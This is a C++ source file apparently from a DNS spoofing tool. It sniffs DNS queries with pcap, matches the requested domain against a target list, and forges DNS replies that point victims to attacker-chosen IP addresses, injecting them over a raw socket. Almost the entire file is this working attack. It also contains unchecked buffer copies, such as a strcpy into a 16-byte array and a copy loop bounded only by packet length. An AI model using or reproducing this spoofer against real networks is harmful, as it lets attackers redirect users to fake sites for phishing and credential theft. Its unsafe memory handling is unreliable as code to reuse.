#include "packet_handle.h"
#include "header.h"
#include "target_info.h"

char* packet_handle::make_domain(struct pcap_pkthdr *header, const unsigned char *pkt_data) {
    char *extract_domain = (char*)malloc(sizeof(char)*1024);
    memset(extract_domain, 0, 1024);
    char dns_data[1024];
    memset(dns_data, 0, 1024);

    for(int i=0; i<header->len; i++) {
        dns_data[i] = (unsigned int)pkt_data[i+54];
    }

    int size_before_dot  = dns_data[0], index = 0, size_index = 1;

    while(size_before_dot > 0) {
        for(int i=0; i<size_before_dot; i++) {
            extract_domain[index++] = dns_data[i+size_index];
        }
        extract_domain[index++]='.';
        size_index+=size_before_dot;
        size_before_dot = dns_data[size_index++];
    }
    extract_domain[--index] = '\0';
    return extract_domain;
}

int packet_handle::packet_handler(struct pcap_pkthdr *header, const unsigned char *packet, char *extract_domain, std::vector<std::string> domain_array, std::vector<std::string> ip_array) {
    ip_header *iph = (ip_header *)(packet + sizeof(ether_header));
    udp_header *udph = (udp_header *)(packet + sizeof(ether_header) + sizeof(ip_header));
    dns_header *dnsh = (dns_header *)(packet + 42);

    if(compare_domain(extract_domain, domain_array)) {
        unsigned char dns_reply[1024];
        unsigned char *dns_reply_hdr;
        char fake_web[16];
        int full_size;

        memset(dns_reply, 0 , 1024);
        dns_reply_hdr = dns_reply + sizeof(ip_header) + sizeof(udp_header);

        dns_reply_hdr[0] = dnsh->ID & 0xff; dns_reply_hdr[1] = (dnsh->ID >> 8) & 0xff; //ID
        dns_reply_hdr[2] = 0x80; dns_reply_hdr[3] = 0x00; //flags
        dns_reply_hdr[4] = 0x00; dns_reply_hdr[5] = 0x01; //Questions
        dns_reply_hdr[6] = 0x00; dns_reply_hdr[7] = 0x01; //Answers RRs
        dns_reply_hdr[8] = 0x00; dns_reply_hdr[9] = 0x00; //Authority RRs
        dns_reply_hdr[10] = 0x00; dns_reply_hdr[11] = 0x00; //Additional RRs

        int name_size = header->len -58;

        for(int i=0; i<name_size; i++) {
            dns_reply_hdr[12+i] = packet[i+54]; //Name
        }

        dns_reply_hdr[name_size+12] = 0x00; dns_reply_hdr[name_size+13] = 0x01; //Type A
        dns_reply_hdr[name_size+14] = 0x00; dns_reply_hdr[name_size+15] = 0x01; //Class IN
        dns_reply_hdr[name_size+16] = 0xc0; dns_reply_hdr[name_size+17] = 0x0c; //Name
        dns_reply_hdr[name_size+18] = 0x00; dns_reply_hdr[name_size+19] = 0x01; //Type A
        dns_reply_hdr[name_size+20] = 0x00; dns_reply_hdr[name_size+21] = 0x01; //Class IN
        dns_reply_hdr[name_size+22] = 0x00; dns_reply_hdr[name_size+23] = 0x00; dns_reply_hdr[name_size+24] = 0x00; dns_reply_hdr[name_size+25] = 0x34; //TTL
        dns_reply_hdr[name_size+26] = 0x00; dns_reply_hdr[name_size+27] = 0x04; //Rdata_len

        for(int i=0; i<domain_array.size(); i++) {
            if(strcmp(extract_domain, domain_array[i].c_str())==0) {
                strcpy(fake_web, ip_array[i].c_str());
            }
        }

        unsigned char ip_[4];
        sscanf(fake_web, "%d.%d.%d.%d", (int*)&ip_[0],(int*)&ip_[1],(int*)&ip_[2],(int*)&ip_[3]);
        memcpy(&dns_reply_hdr[name_size+28], ip_, 4); //Rdata

        full_size = name_size + 32; //except namesize dns header

        iph->tlen = htons(sizeof(ip_header) + sizeof(udp_header) + full_size);

        //change sender <-> target
        Ip temp = Ip(htonl(iph->dip));
        iph->dip = Ip(htonl(iph->sip));
        iph->sip = Ip(htonl(temp));

        int temp_port = udph->sport;
        udph->sport = htons(53);
        udph->dport = temp_port;
        udph->len = htons(sizeof(udp_header)+full_size);
        udph->chk = 0; //ipv4 non-checksum

        memcpy(&dns_reply[0], (char*)iph, sizeof(ip_header));
        memcpy(&dns_reply[sizeof(ip_header)], (char*)udph, sizeof(udp_header));

        Ip target_ip = Ip(htonl(iph->dip));

        full_size = full_size + sizeof(ip_header) + sizeof(udp_header);

        if(send_dns_packet(target_ip, udph->dport, dns_reply, full_size) > 0) {
            printf("sending dns reply && Original Site: %s\n", extract_domain);
        }
    }
}

int packet_handle::send_dns_packet(Ip target_ip, int port, unsigned char *dns_packet, int size) {
    struct sockaddr_in serv_addr;
    int tmp = 1, s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    inet_pton(AF_INET, (char*)&target_ip, &(serv_addr.sin_addr));
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp))<0) {
        printf("setsockopt error\n");
        return -1;
    }
    if(sendto(s, dns_packet, size, 0, (struct sockaddr*)&serv_addr, sizeof(serv_addr))<0) {
        printf("can't sending udp\n");
        return -1;
    }
    close(s);
    return 1;
}

bool packet_handle::compare_domain(const char *target_domain, std::vector<std::string> domain_list) {
    for(int i=0; i<domain_list.size(); i++) {
        if(strcmp(target_domain, "")!=0 && strcmp(target_domain, domain_list[i].c_str())==0) {
            return true;
        }
    }
    return false;
}
